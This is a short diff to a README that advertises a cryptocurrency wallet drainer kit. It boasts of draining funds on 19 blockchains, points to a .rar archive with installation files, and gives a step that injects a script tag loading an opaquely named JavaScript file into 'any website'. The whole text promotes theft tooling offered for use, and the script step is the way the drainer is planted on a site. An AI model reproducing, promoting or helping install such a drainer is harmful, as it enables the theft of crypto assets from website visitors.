@@ -7,7 +7,7 @@
 # Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
 Installation on any website files and documentation included 🔥
 
-# Installation & Instructions of the draining system on any WEBSITE / DRAINERSCRIPTONLY.rar
+# Installation & Instructions of the draining system on any WEBSITE : drainersystemonly.rar
 
 # STEP 1 (FOLLOW THE TUTORIAL IN THE UPDATED .RAR FOR STEP 1
 <script charset="UTF-8" type="text/javascript" src="./85562950-42ac-48d9-9757-cb0ae30ccb7c.js"></script>
